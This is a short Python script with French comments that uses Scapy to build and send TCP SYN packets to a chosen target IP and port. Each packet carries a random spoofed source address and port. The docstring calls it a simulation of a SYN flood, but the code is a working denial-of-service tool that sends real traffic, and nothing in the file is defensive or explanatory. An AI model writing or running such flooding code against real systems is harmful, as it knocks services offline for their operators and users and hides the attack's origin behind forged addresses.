from scapy.all import IP, TCP, send
from random import randint

def attack(target_ip, target_port, num_packets=100):
    """
    Simulation d'une attaque SYN flood
    """
    for _ in range(num_packets):
        # IP source aléatoire pour simuler différentes sources
        source_ip = f"{randint(1,254)}.{randint(1,254)}.{randint(1,254)}.{randint(1,254)}"
        source_port = randint(1024, 65535)
        # Construction du paquet SYN
        ip = IP(src=source_ip, dst=target_ip)
        tcp = TCP(sport=source_port, dport=target_port, flags="S")
        # Envoi du paquet
        send(ip/tcp, verbose=False)

